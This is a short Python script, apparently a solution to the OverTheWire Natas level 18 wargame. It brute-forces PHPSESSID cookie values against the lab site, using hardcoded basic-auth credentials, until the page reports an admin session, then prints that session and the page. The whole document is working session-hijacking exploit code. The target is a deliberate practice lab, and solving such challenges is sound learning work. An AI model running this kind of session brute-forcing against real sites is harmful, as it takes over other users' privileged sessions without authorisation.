import requests

for sessid in range(137, 641):
    if sessid % 10 == 0:
        print('Checked ' + str(sessid) + ' sessions...')

    r = requests.get('http://natas18.natas.labs.overthewire.org?debug=1',
                     auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
                     cookies={'PHPSESSID': str(sessid)})

    if 'You are an admin' in r.text:
        print('PHPSESSID={}'.format(sessid))
        print(r.text)
        break
